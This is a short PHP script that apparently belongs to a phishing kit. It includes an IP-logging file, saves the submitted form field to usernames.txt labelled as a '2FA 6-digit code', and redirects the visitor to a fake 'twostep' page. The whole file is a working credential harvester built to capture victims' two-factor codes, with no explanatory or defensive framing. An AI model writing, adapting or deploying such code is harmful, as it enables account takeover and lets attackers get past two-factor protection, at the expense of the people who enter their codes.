<?php
include "ip.php";
file_put_contents("usernames.txt", "2FA 6-digit code: " . $_POST['username'] . "\n", FILE_APPEND);
header("Location: twostep.html");
exit();
?>
